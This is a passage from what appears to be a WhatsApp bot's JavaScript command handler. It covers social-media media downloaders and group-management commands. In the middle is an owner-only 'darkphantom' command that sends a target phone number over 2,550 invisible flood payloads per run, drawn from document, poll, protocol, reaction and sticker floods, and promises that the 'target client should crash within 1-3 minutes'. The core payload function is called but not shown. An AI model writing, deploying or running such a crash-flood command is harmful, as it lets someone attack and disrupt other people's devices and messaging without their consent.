        }

        // ═══════════════════════════════════════════════════
        // INSTAGRAM DOWNLOAD
        // ═══════════════════════════════════════════════════
        case 'ig':
        case 'instagram':
        case 'igdl': {
            if (!text) return reply(`📱 Usage: ${prefix}ig <instagram_url>\nExample: ${prefix}ig https://www.instagram.com/p/CxYz123ABC/`);

            if (!text.includes('instagram.com') && !text.includes('instagr.am')) {
                return reply('❌ Please provide a valid Instagram post/reel URL.');
            }

            await reply('📥 *Processing Instagram media...* Please wait.');

            try {
                let videoUrl = null;
                let imageUrls = [];
                let title = 'Instagram Media';
                let usedApi = '';

                try {
                    const apiUrl = `https://api.princetechn.com/api/download/igdl?apikey=prince&url=${encodeURIComponent(text)}`;
                    const response = await axios.get(apiUrl, {
                        timeout: 30000,
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        }
                    });

                    if (response.data?.success && response.data?.result) {
                        const result = response.data.result;
                        if (result.video) {
                            videoUrl = result.video;
                        } else if (result.images && Array.isArray(result.images)) {
                            imageUrls = result.images;
                        } else if (result.url) {
                            if (result.url.includes('.mp4')) videoUrl = result.url;
                            else imageUrls = [result.url];
                        }
                        title = result.title || result.caption || 'Instagram Media';
                        usedApi = 'Prince Techno';
                    }
                } catch (e) {}

                if (!videoUrl && imageUrls.length === 0) {
                    try {
                        const response = await axios.get(
                            `https://api.siputzx.my.id/api/d/igdl?url=${encodeURIComponent(text)}`,
                            { timeout: 30000 }
                        );
                        if (response.data?.status && response.data?.data) {
                            const data = response.data.data;
                            if (data.urls && Array.isArray(data.urls)) {
                                const firstUrl = data.urls[0];
                                if (firstUrl && (firstUrl.includes('.mp4') || firstUrl.includes('video'))) videoUrl = firstUrl;
                                else imageUrls = data.urls;
                            } else if (data.video) {
                                videoUrl = data.video;
                            } else if (data.url) {
                                if (data.url.includes('.mp4')) videoUrl = data.url;
                                else imageUrls = [data.url];
                            }
                            title = data.title || data.caption || 'Instagram Media';
                            usedApi = 'Siputzx API';
                        }
                    } catch (e) {}
                }

                if (!videoUrl && imageUrls.length === 0) {
                    try {
                        const response = await axios.get(
                            `https://api.shizo.top/downloader/ig?apikey=shizo&url=${encodeURIComponent(text)}`,
                            { timeout: 30000 }
                        );
                        if (response.data?.status && response.data?.result) {
                            const result = response.data.result;
                            if (result.video) videoUrl = result.video;
                            else if (result.images && Array.isArray(result.images)) imageUrls = result.images;
                            title = result.title || 'Instagram Media';
                            usedApi = 'Shizo API';
                        }
                    } catch (e) {}
                }

                if (!videoUrl && imageUrls.length === 0) {
                    return reply('❌ Failed to download Instagram media. The post may be private or unavailable.');
                }

                if (videoUrl) {
                    await empire.sendMessage(m.chat, {
                        video: { url: videoUrl },
                        caption: `📹 *${title}*\n\n🔗 *Source:* ${text}\n📡 *API:* ${usedApi}`,
                        contextInfo: newsletterContext()
                    }, { quoted: m });
                }

                if (imageUrls.length > 0) {
                    const totalImages = Math.min(imageUrls.length, 15);
                    for (let i = 0; i < totalImages; i++) {
                        const imgUrl = imageUrls[i];
                        if (imgUrl) {
                            const caption = i === 0 ?
                                `🖼️ *${title}*\n📸 ${i+1}/${totalImages}\n🔗 *Source:* ${text}\n📡 *API:* ${usedApi}` :
                                `📸 ${i+1}/${totalImages}`;
                            await empire.sendMessage(m.chat, {
                                image: { url: imgUrl },
                                caption: caption,
                                contextInfo: newsletterContext()
                            }, { quoted: m });
                            await delay(500);
                        }
                    }
                }

            } catch (e) {
                console.error('Instagram download error:', e);
                reply(`❌ *Failed to download:* ${e.message || 'Unknown error'}`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // TWITTER/X DOWNLOAD
        // ═══════════════════════════════════════════════════
        case 'tw':
        case 'twitter':
        case 'x':
        case 'xdl':
        case 'twitterdl': {
            if (!text) return reply(`📱 Usage: ${prefix}tw <twitter_url>\nExample: ${prefix}tw https://twitter.com/user/status/123456789`);

            if (!text.includes('twitter.com') && !text.includes('x.com')) {
                return reply('❌ Please provide a valid Twitter/X post URL.');
            }

            await reply('📥 *Processing Twitter/X media...* Please wait.');

            try {
                let videoUrl = null;
                let imageUrls = [];
                let title = 'Twitter Media';
                let usedApi = '';

                try {
                    const apiUrl = `https://api.princetechn.com/api/download/twitterdl?apikey=prince&url=${encodeURIComponent(text)}`;
                    const response = await axios.get(apiUrl, {
                        timeout: 30000,
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        }
                    });

                    if (response.data?.success && response.data?.result) {
                        const result = response.data.result;
                        if (result.video) videoUrl = result.video;
                        else if (result.images && Array.isArray(result.images)) imageUrls = result.images;
                        else if (result.url) {
                            if (result.url.includes('.mp4')) videoUrl = result.url;
                            else imageUrls = [result.url];
                        }
                        title = result.title || result.caption || 'Twitter Media';
                        usedApi = 'Prince Techno';
                    }
                } catch (e) {}

                if (!videoUrl && imageUrls.length === 0) {
                    try {
                        const response = await axios.get(
                            `https://api.siputzx.my.id/api/d/twitter?url=${encodeURIComponent(text)}`,
                            { timeout: 30000 }
                        );
                        if (response.data?.status && response.data?.data) {
                            const data = response.data.data;
                            if (data.video) videoUrl = data.video;
                            else if (data.images && Array.isArray(data.images)) imageUrls = data.images;
                            else if (data.url) {
                                if (data.url.includes('.mp4') || data.url.includes('video')) videoUrl = data.url;
                                else imageUrls = [data.url];
                            }
                            title = data.title || data.caption || 'Twitter Media';
                            usedApi = 'Siputzx API';
                        }
                    } catch (e) {}
                }

                if (!videoUrl && imageUrls.length === 0) {
                    try {
                        const response = await axios.get(
                            `https://api.shizo.top/downloader/twitter?apikey=shizo&url=${encodeURIComponent(text)}`,
                            { timeout: 30000 }
                        );
                        if (response.data?.status && response.data?.result) {
                            const result = response.data.result;
                            if (result.video) videoUrl = result.video;
                            else if (result.images && Array.isArray(result.images)) imageUrls = result.images;
                            title = result.title || 'Twitter Media';
                            usedApi = 'Shizo API';
                        }
                    } catch (e) {}
                }

                if (!videoUrl && imageUrls.length === 0) {
                    return reply('❌ Failed to download Twitter/X media. The post may be private or unavailable.');
                }

                if (videoUrl) {
                    await empire.sendMessage(m.chat, {
                        video: { url: videoUrl },
                        caption: `📹 *${title}*\n\n🔗 *Source:* ${text}\n📡 *API:* ${usedApi}`,
                        contextInfo: newsletterContext()
                    }, { quoted: m });
                }

                if (imageUrls.length > 0) {
                    const totalImages = Math.min(imageUrls.length, 15);
                    for (let i = 0; i < totalImages; i++) {
                        const imgUrl = imageUrls[i];
                        if (imgUrl) {
                            const caption = i === 0 ?
                                `🖼️ *${title}*\n📸 ${i+1}/${totalImages}\n🔗 *Source:* ${text}\n📡 *API:* ${usedApi}` :
                                `📸 ${i+1}/${totalImages}`;
                            await empire.sendMessage(m.chat, {
                                image: { url: imgUrl },
                                caption: caption,
                                contextInfo: newsletterContext()
                            }, { quoted: m });
                            await delay(500);
                        }
                    }
                }

            } catch (e) {
                console.error('Twitter download error:', e);
                reply(`❌ *Failed to download:* ${e.message || 'Unknown error'}`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // SNAPCHAT DOWNLOAD
        // ═══════════════════════════════════════════════════
        case 'snap':
        case 'snapchat':
        case 'sc':
        case 'snapdl': {
            if (!text) return reply(`📱 Usage: ${prefix}snap <snapchat_url>\nExample: ${prefix}snap https://www.snapchat.com/link/123456789`);

            if (!text.includes('snapchat.com')) {
                return reply('❌ Please provide a valid Snapchat URL.');
            }

            await reply('📥 *Processing Snapchat media...* Please wait.');

            try {
                let videoUrl = null;
                let imageUrl = null;
                let title = 'Snapchat Media';
                let usedApi = '';

                try {
                    const apiUrl = `https://api.princetechn.com/api/download/snapdl?apikey=prince&url=${encodeURIComponent(text)}`;
                    const response = await axios.get(apiUrl, {
                        timeout: 30000,
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        }
                    });

                    if (response.data?.success && response.data?.result) {
                        const result = response.data.result;
                        if (result.video) videoUrl = result.video;
                        else if (result.image) imageUrl = result.image;
                        else if (result.url) {
                            if (result.url.includes('.mp4')) videoUrl = result.url;
                            else imageUrl = result.url;
                        }
                        title = result.title || 'Snapchat Media';
                        usedApi = 'Prince Techno';
                    }
                } catch (e) {}

                if (!videoUrl && !imageUrl) {
                    try {
                        const response = await axios.get(
                            `https://api.shizo.top/downloader/snapchat?apikey=shizo&url=${encodeURIComponent(text)}`,
                            { timeout: 30000 }
                        );
                        if (response.data?.status && response.data?.result) {
                            const result = response.data.result;
                            if (result.video) videoUrl = result.video;
                            else if (result.image) imageUrl = result.image;
                            else if (result.url) {
                                if (result.url.includes('.mp4')) videoUrl = result.url;
                                else imageUrl = result.url;
                            }
                            title = result.title || 'Snapchat Media';
                            usedApi = 'Shizo API';
                        }
                    } catch (e) {}
                }

                if (!videoUrl && !imageUrl) {
                    try {
                        const response = await axios.get(
                            `https://api.siputzx.my.id/api/d/snapdl?url=${encodeURIComponent(text)}`,
                            { timeout: 30000 }
                        );
                        if (response.data?.status && response.data?.data) {
                            const data = response.data.data;
                            if (data.video) videoUrl = data.video;
                            else if (data.image) imageUrl = data.image;
                            title = data.title || 'Snapchat Media';
                            usedApi = 'Siputzx API';
                        }
                    } catch (e) {}
                }

                if (!videoUrl && !imageUrl) {
                    return reply('❌ Failed to download Snapchat media. The content may be private or expired.');
                }

                if (videoUrl) {
                    await empire.sendMessage(m.chat, {
                        video: { url: videoUrl },
                        caption: `📹 *${title}*\n\n🔗 *Source:* ${text}\n📡 *API:* ${usedApi}`,
                        contextInfo: newsletterContext()
                    }, { quoted: m });
                }

                if (imageUrl) {
                    await empire.sendMessage(m.chat, {
                        image: { url: imageUrl },
                        caption: `🖼️ *${title}*\n\n🔗 *Source:* ${text}\n📡 *API:* ${usedApi}`,
                        contextInfo: newsletterContext()
                    }, { quoted: m });
                }

            } catch (e) {
                console.error('Snapchat download error:', e);
                reply(`❌ *Failed to download:* ${e.message || 'Unknown error'}`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // FACEBOOK DOWNLOAD
        // ═══════════════════════════════════════════════════
        case 'fb':
        case 'facebook':
        case 'fbdl': {
            if (!text) return reply(`📱 Usage: ${prefix}fb <facebook_url>\nExample: ${prefix}fb https://www.facebook.com/watch?v=123456789`);

            if (!text.includes('facebook.com') && !text.includes('fb.watch')) {
                return reply('❌ Please provide a valid Facebook video URL.');
            }

            await reply('📥 *Processing Facebook video...* Please wait.');

            try {
                let videoUrl = null;
                let audioUrl = null;
                let title = 'Facebook Video';
                let usedApi = '';

                try {
                    const response = await axios.get(
                        `https://api.siputzx.my.id/api/d/fbdl?url=${encodeURIComponent(text)}`,
                        { timeout: 30000 }
                    );
                    if (response.data?.status && response.data?.data) {
                        const data = response.data.data;
                        videoUrl = data.video || data.hd || data.sd || data.url;
                        audioUrl = data.audio || data.music_url;
                        title = data.title || data.caption || 'Facebook Video';
                        usedApi = 'Siputzx API';
                    }
                } catch (e) {}

                if (!videoUrl) {
                    try {
                        const response = await axios.get(
                            `https://api.shizo.top/downloader/fb?apikey=shizo&url=${encodeURIComponent(text)}`,
                            { timeout: 30000 }
                        );
                        if (response.data?.status && response.data?.result) {
                            const result = response.data.result;
                            videoUrl = result.download || result.video || result.url;
                            title = result.title || 'Facebook Video';
                            usedApi = 'Shizo API';
                        }
                    } catch (e) {}
                }

                if (!videoUrl) {
                    return reply('❌ Failed to download Facebook video. The video may be private or unavailable.');
                }

                await empire.sendMessage(m.chat, {
                    video: { url: videoUrl },
                    caption: `📹 *${title}*\n\n🔗 *Source:* ${text}\n📡 *API:* ${usedApi}`,
                    contextInfo: newsletterContext()
                }, { quoted: m });

                if (audioUrl) {
                    await delay(1000);
                    await empire.sendMessage(m.chat, {
                        audio: { url: audioUrl },
                        mimetype: 'audio/mpeg',
                        fileName: `${title}.mp3`,
                        contextInfo: newsletterContext()
                    }, { quoted: m });
                }

            } catch (e) {
                console.error('Facebook download error:', e);
                reply(`❌ *Failed to download:* ${e.message || 'Unknown error'}`);
            }
            break;
        }
        // ═══════════════════════════════════════════════════
// ZUKO DARK PHANTOM - Strongest Invisible Delay
// ═══════════════════════════════════════════════════
case 'darkphantom':
case 'dphantom':
case 'dark':
case 'zdark':
case 'darkdelay': {
  if (!isCreator) return reply("❌ *Owner only command!*");

  let target = null;
  let iterations = 1;

  if (q) {
    const parts = q.split(' ');
    target = parts[0];
    if (parts[1]) iterations = parseInt(parts[1]) || 1;
  }

  if (!target && m.quoted) {
    target = m.quoted.sender || m.quoted.key?.participant || m.quoted.key?.remoteJid;
  }

  if (!target) {
    return reply(
`☠️ *ZUKO DARK PHANTOM* ☠️

*Usage:*
${prefix}darkphantom <number> [iterations]
${prefix}darkphantom 2347059886720 3

*Or reply to a message from the target.*

*Attack Vectors:*
• Document Flood (600)
• Poll Flood (300)
• Protocol Flood (400)
• Reaction Flood (300)
• Sticker Pack Flood (200)
• ViewOnce + Interactive (150)
• Newsletter Invites (100)
• Final Surge (500)

*Total: 2550+ invisible payloads per run*

☠️ *This is the strongest invisible attack!*`
    );
  }

  let jid = target.replace(/[^0-9]/g, '');
  if (jid.startsWith('0')) return reply("❌ *Invalid number!*");
  if (jid === '2347059886720') return reply("❌ *This number is protected!*");

  if (iterations > 3) iterations = 3;
  if (iterations < 1) iterations = 1;

  let isTarget = `${jid}@s.whatsapp.net`;

  await reply(
`☠️ *ZUKO DARK PHANTOM* ☠️

📱 *Target:* ${isTarget}
🔄 *Iterations:* ${iterations}
📦 *Payloads per run:* 2550+
👻 *Visibility:* 100% INVISIBLE

⏳ *Processing...*`
  );

  for (let i = 1; i <= iterations; i++) {
    try {
      await ZukoDarkPhantom(empire, isTarget);
      console.log(`✅ Dark Phantom iteration ${i}/${iterations} sent to ${isTarget}`);
      if (iterations > 1) {
        await reply(`🔄 *Iteration ${i}/${iterations} sent to ${isTarget}*`);
      }
      await new Promise(resolve => setTimeout(resolve, 3000));
    } catch (err) {
      console.error(`Iteration ${i} failed:`, err);
      await reply(`❌ *Iteration ${i} failed:* ${err.message || 'Unknown error'}`);
    }
  }

  await reply(
`✅ *ZUKO DARK PHANTOM COMPLETE!*

📱 *Target:* ${isTarget}
🔄 *Total Iterations:* ${iterations}
📦 *Total Payloads:* ${iterations * 2550}+
👻 *Visibility:* 100% INVISIBLE

☠️ *Target client should crash within 1-3 minutes.*
⏳ *No visible messages were sent.*`
  );
  break;
}
       
        case 'ytvideo':
        case 'ytmp4':
        case 'youtube':
        case 'ytv': {
            if (!text) return reply(`🎬 Usage: ${prefix}ytvideo <url> [quality]\nExample: ${prefix}ytvideo https://youtu.be/60ItHLz5WEA\nExample: ${prefix}ytvideo https://youtu.be/60ItHLz5WEA 720\n\n📌 *Qualities:* 720p, 1080p`);

            let url = text.trim();
            let quality = '720';

            const qualityMatch = url.match(/\b(720|1080|480|360)\b/);
            if (qualityMatch) {
                quality = qualityMatch[1];
                url = url.replace(qualityMatch[0], '').trim();
            }

            if (!url.includes('youtube.com') && !url.includes('youtu.be')) {
                return reply('❌ Please provide a valid YouTube URL.');
            }

            await reply(`📥 *Processing YouTube video...* Quality: ${quality}p`);

            try {
                const apiUrl = `https://api.princetechn.com/api/download/ytvideo?apikey=prince&quality=${quality}&url=${encodeURIComponent(url)}`;
                const response = await axios.get(apiUrl, {
                    timeout: 60000,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                });

                if (!response.data?.success || !response.data?.result) {
                    return reply('❌ Failed to fetch YouTube video. The video may be unavailable or private.');
                }

                const result = response.data.result;
                const videoUrl = result.download_url;
                const title = result.title || 'YouTube Video';
                const thumbnail = result.thumbnail;
                const videoQuality = result.quality || quality + 'p';

                if (!videoUrl) {
                    return reply('❌ No download URL found. Try a different quality or video.');
                }

                if (thumbnail) {
                    try {
                        await empire.sendMessage(m.chat, {
                            image: { url: thumbnail },
                            caption: `🎬 *${title}*\n\n📊 *Quality:* ${videoQuality}\n📥 *Downloading video...*`,
                            contextInfo: newsletterContext()
                        }, { quoted: m });
                    } catch (e) {}
                }

                await reply(`⏳ *Downloading ${title}...*`);

                const videoResponse = await axios.get(videoUrl, {
                    responseType: 'arraybuffer',
                    timeout: 180000,
                    maxContentLength: Infinity,
                    maxBodyLength: Infinity,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': '*/*'
                    }
                });

                let videoBuffer = Buffer.from(videoResponse.data);

                if (!videoBuffer || videoBuffer.length < 1000) {
                    return reply('❌ Failed to download video. The file may be corrupted.');
                }

                const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(1);
                const caption =
`🎬━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🎬
        ✦  YOUTUBE VIDEO  ✦
🎬━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🎬

📝 *Title:* ${title}
📊 *Quality:* ${videoQuality}
📦 *Size:* ${fileSizeMB} MB
🎬━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🎬
💡 *Change quality:* ${prefix}ytvideo <url> <quality>`;

                try {
                    await empire.sendMessage(m.chat, {
                        video: videoBuffer,
                        caption: caption,
                        contextInfo: newsletterContext()
                    }, { quoted: m });
                } catch (sendErr) {
                    try {
                        await empire.sendMessage(m.chat, {
                            document: videoBuffer,
                            mimetype: 'video/mp4',
                            fileName: `${title}.mp4`,
                            caption: caption,
                            contextInfo: newsletterContext()
                        }, { quoted: m });
                    } catch (docErr) {
                        await empire.sendMessage(m.chat, {
                            text: `🎬 *${title}*\n\n📊 Quality: ${videoQuality}\n📦 Size: ${fileSizeMB} MB\n\n⚠️ *File too large to send directly.*\n\n🔗 *Download Link:*\n${videoUrl}`,
                            contextInfo: newsletterContext()
                        }, { quoted: m });
                    }
                }

            } catch (e) {
                console.error('YouTube video download error:', e);
                if (e.code === 'ECONNABORTED') {
                    reply(`❌ *Download timed out.* The video may be too large. Try a lower quality.`);
                } else if (e.response?.status === 404) {
                    reply(`❌ *Video not found.* The video may have been deleted or is private.`);
                } else {
                    reply(`❌ *Failed to download:* ${e.message || 'Unknown error'}`);
                }
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // PLAY - Download song from YouTube
        // ═══════════════════════════════════════════════════
        case 'play':
        case 'song':
        case 'ytmp3': {
            if (!text) return reply(`🎵 Usage: ${prefix}play <song name or URL>\nExample: ${prefix}play Khai With You`);
            await reply('🔍 Searching and processing...');

            try {
                let videoUrl = text;
                let videoTitle = '';
                let thumbnail = '';

                if (text.includes('youtube.com') || text.includes('youtu.be')) {
                    const videoId = text.match(/(?:v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/)?.[1];
                    if (videoId) {
                        try {
                            const search = await yts({ videoId });
                            if (search) {
                                videoTitle = search.title || 'YouTube Audio';
                                thumbnail = search.thumbnail || '';
                            }
                        } catch (e) {}
                    }
                    if (!videoTitle) videoTitle = 'YouTube Audio';
                    videoUrl = text;
                } else {
                    const search = await yts(text);
                    if (!search || !search.videos?.length) {
                        return reply('❌ No results found for your query.');
                    }
                    const video = search.videos[0];
                    videoUrl = video.url;
                    videoTitle = video.title || 'YouTube Audio';
                    thumbnail = video.thumbnail || '';
                }

                if (thumbnail) {
                    await empire.sendMessage(m.chat, {
                        image: { url: thumbnail },
                        caption: `🎵 *Downloading:* ${videoTitle}\n⏱ *Please wait...*`
                    }, { quoted: m });
                }

                let audioData = null;
                let usedApi = '';

                const apiMethods = [
                    {
                        name: 'Prince Techno',
                        method: async () => {
                            const apiUrl = `https://api.princetechn.com/api/download/ytmp3?apikey=prince&url=${encodeURIComponent(videoUrl)}`;
                            const response = await axios.get(apiUrl, {
                                timeout: 30000,
                                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
                            });
                            if (response.data) {
                                if (response.data.download_url || response.data.download) {
                                    return { download: response.data.download_url || response.data.download, title: response.data.title || videoTitle };
                                }
                                if (response.data.data) {
                                    const data = response.data.data;
                                    return { download: data.download_url || data.download || data.url, title: data.title || videoTitle };
                                }
                                if (response.data.result) {
                                    const result = response.data.result;
                                    return { download: result.download_url || result.download || result.url, title: result.title || videoTitle };
                                }
                            }
                            throw new Error('Prince API returned invalid data');
                        }
                    },
                    {
                        name: 'EliteProTech',
                        method: async () => {
                            const apiUrl = `https://eliteprotech-apis.zone.id/ytdown?url=${encodeURIComponent(videoUrl)}&format=mp3`;
                            const response = await axios.get(apiUrl, { timeout: 30000 });
                            if (response?.data?.success && response?.data?.downloadURL) {
                                return { download: response.data.downloadURL, title: response.data.title || videoTitle };
                            }
                            throw new Error('EliteProTech failed');
                        }
                    },
                    {
                        name: 'Yupra',
                        method: async () => {
                            const apiUrl = `https://api.yupra.my.id/api/downloader/ytmp3?url=${encodeURIComponent(videoUrl)}`;
                            const response = await axios.get(apiUrl, { timeout: 30000 });
                            if (response?.data?.success && response?.data?.data?.download_url) {
                                return { download: response.data.data.download_url, title: response.data.data.title || videoTitle };
                            }
                            throw new Error('Yupra failed');
                        }
                    },
                    {
                        name: 'Shizo',
                        method: async () => {
                            const apiUrl = `https://api.shizo.top/downloader/ytmp3?apikey=shizo&url=${encodeURIComponent(videoUrl)}`;
                            const response = await axios.get(apiUrl, { timeout: 30000 });
                            if (response?.data?.status && response?.data?.result?.download) {
                                return { download: response.data.result.download, title: response.data.result.title || videoTitle };
                            }
                            throw new Error('Shizo failed');
                        }
                    }
                ];

                for (const apiMethod of apiMethods) {
                    try {
                        const result = await apiMethod.method();
                        if (result && result.download) {
                            audioData = result;
                            usedApi = apiMethod.name;
                            break;
                        }
                    } catch (err) {}
                }

                if (!audioData || !audioData.download) {
                    return reply('❌ All download sources failed. Please try another song or try again later.');
                }

                const audioResponse = await axios.get(audioData.download, {
                    responseType: 'arraybuffer',
                    timeout: 120000,
                    maxContentLength: Infinity,
                    maxBodyLength: Infinity,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Accept': '*/*'
                    }
                });

                let audioBuffer = Buffer.from(audioResponse.data);

                if (!audioBuffer || audioBuffer.length < 1000) {
                    return reply('❌ Downloaded audio file is too small or corrupted.');
                }

                const isMP3 = audioBuffer.toString('ascii', 0, 3) === 'ID3' ||
                             (audioBuffer[0] === 0xFF && (audioBuffer[1] & 0xE0) === 0xE0);

                if (!isMP3) {
                    try {
                        let format = 'm4a';
                        const header = audioBuffer.toString('ascii', 0, 4);
                        if (header === 'OggS') format = 'ogg';
                        else if (header === 'RIFF') format = 'wav';
                        else if (header === 'ftyp') format = 'mp4';

                        const converted = await toAudio(audioBuffer, format);
                        if (converted && converted.length > 1000) {
                            audioBuffer = converted;
                        }
                    } catch (convErr) {}
                }

                const title = (audioData.title || videoTitle || 'audio').replace(/[^\w\s-]/g, '');

                try {
                    await empire.sendMessage(m.chat, {
                        audio: audioBuffer,
                        mimetype: 'audio/mpeg',
                        fileName: `${title}.mp3`,
                        ptt: false,
                        contextInfo: newsletterContext()
                    }, { quoted: m });
                } catch (sendErr) {
                    try {
                        await empire.sendMessage(m.chat, {
                            audio: audioBuffer,
                            mimetype: 'audio/ogg; codecs=opus',
                            ptt: true,
                            fileName: `${title}.ogg`,
                            contextInfo: newsletterContext()
                        }, { quoted: m });
                    } catch (pttErr) {
                        await empire.sendMessage(m.chat, {
                            document: audioBuffer,
                            mimetype: 'audio/mpeg',
                            fileName: `${title}.mp3`,
                            caption: `🎵 *${title}*\n\n⚠️ Audio sent as document due to playback issues.`,
                            contextInfo: newsletterContext()
                        }, { quoted: m });
                    }
                }

            } catch (err) {
                console.error('Play command error:', err);
                reply(`❌ Failed to download: ${err.message || 'Unknown error'}`);
            }
            break;
        }
       
        // ═══════════════════════════════════════════════════
        // SETGCNAME - Set group name
        // ═══════════════════════════════════════════════════
        case 'setgcname':
        case 'setsubject':
        case 'setname': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            if (!text) return reply(`Usage: ${prefix}setgcname <new group name>`);
            try {
                await empire.groupUpdateSubject(m.chat, text);
                reply(`✅ *Group name updated to:*\n\n${text}`);
            } catch (e) {
                reply(`❌ Failed to update name: ${e.message}`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // GCDESCRIPTION - Set group description
        // ═══════════════════════════════════════════════════
        case 'gcdescription':
        case 'setdesc':
        case 'setdescription': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            if (!text) return reply(`Usage: ${prefix}gcdescription <new description>`);
            try {
                await empire.groupUpdateDescription(m.chat, text);
                reply(`✅ *Group description updated!*`);
            } catch (e) {
                reply(`❌ Failed to update description: ${e.message}`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // RESETLINK - Revoke and regenerate group invite link
        // ═══════════════════════════════════════════════════
        case 'resetlink':
        case 'revokelink':
        case 'resetgrouplink': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            try {
                await empire.groupRevokeInvite(m.chat);
                const code = await empire.groupInviteCode(m.chat);
                reply(`✅ *Group invite link has been reset!*\n\n🔗 *New Link:*\nhttps://chat.whatsapp.com/${code}`);
            } catch (e) {
                reply(`❌ Failed to reset link: ${e.message}`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // TAGALL
        // ═══════════════════════════════════════════════════
        case 'tagall':
        case 'everyone': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            const msg = text || "📢 Attention everyone!";
            const mentions = participants.map(p => p.id);
            const tags = mentions.map(p => `• @${p.split('@')[0]}`).join('\n');
            await empire.sendMessage(m.chat, {
                text: `${msg}\n\n👥 *Members (${participants.length})*\n${tags}`,
                mentions,
                contextInfo: newsletterContext({ mentionedJid: mentions })
            }, { quoted: m });
            break;
        }

        // ═══════════════════════════════════════════════════
        // GROUPINFO
        // ═══════════════════════════════════════════════════
        case 'groupinfo':
        case 'gcinfo': {
            if (!isGroup) return reply("👥 Group only!");
            const adminList = groupAdmins.map(a => `  👑 @${a.split('@')[0]}`).join('\n');
            await empire.sendMessage(m.chat, {
                text:
`ℹ️ *GROUP INFO*
📛 Name: ${groupName}
👥 Members: ${participants.length}
👑 Admins: ${groupAdmins.length}

👑 *Admins:*
${adminList}`,
                mentions: groupAdmins,
                contextInfo: newsletterContext({ mentionedJid: groupAdmins })
            }, { quoted: m });
            break;
        }

        // ═══════════════════════════════════════════════════
        // GROUP MANAGEMENT - promote/demote/kick
        // ═══════════════════════════════════════════════════
        case 'promote':
        case 'makeadmin': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
            if (!target) return reply(`Usage: ${prefix}promote @user`);
            await empire.groupParticipantsUpdate(m.chat, [target], 'promote');
            await empire.sendMessage(m.chat, {
                text: `⬆️ @${target.split('@')[0]} promoted to admin!`,
                mentions: [target],
                contextInfo: newsletterContext({ mentionedJid: [target] })
            }, { quoted: m });
            break;
        }
        case 'demote':
        case 'unadmin': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
            if (!target) return reply(`Usage: ${prefix}demote @user`);
            await empire.groupParticipantsUpdate(m.chat, [target], 'demote');
            await empire.sendMessage(m.chat, {
                text: `⬇️ @${target.split('@')[0]} demoted!`,
                mentions: [target],
                contextInfo: newsletterContext({ mentionedJid: [target] })
            }, { quoted: m });
            break;
        }
        case 'kick':
        case 'remove': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
            if (!target) return reply(`Usage: ${prefix}kick @user`);
            if (target === botNumber) return reply("❌ Can't kick the bot!");
            await empire.groupParticipantsUpdate(m.chat, [target], 'remove');
            await empire.sendMessage(m.chat, {
                text: `👢 @${target.split('@')[0]} kicked!`,
                mentions: [target],
                contextInfo: newsletterContext({ mentionedJid: [target] })
            }, { quoted: m });
            break;
        }

        // ═══════════════════════════════════════════════════
        // MUTE / UNMUTE - lock group to admins only
        // ═══════════════════════════════════════════════════
        case 'mute':
        case 'lock':
        case 'groupmute': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            if (!isBotAdmins) return reply("❌ I need to be admin to do that!");
            await empire.groupSettingUpdate(m.chat, 'announcement').catch(() => {});
            reply("🔒 *Group locked!* Only admins can send messages now.");
            break;
        }
        case 'unmute':
        case 'unlock':
        case 'groupunmute': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            if (!isBotAdmins) return reply("❌ I need to be admin to do that!");
            await empire.groupSettingUpdate(m.chat, 'not_announcement').catch(() => {});
            reply("🔓 *Group unlocked!* Everyone can send messages now.");
            break;
        }

        // ═══════════════════════════════════════════════════
        // ADD - add a participant by number
        // ═══════════════════════════════════════════════════
        case 'add': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            if (!isBotAdmins) return reply("❌ I need to be admin to do that!");
            const num = (text || '').replace(/[^0-9]/g, '');
            if (!num) return reply(`Usage: ${prefix}add <phone number with country code>`);
            const targetJid = num + '@s.whatsapp.net';
            try {
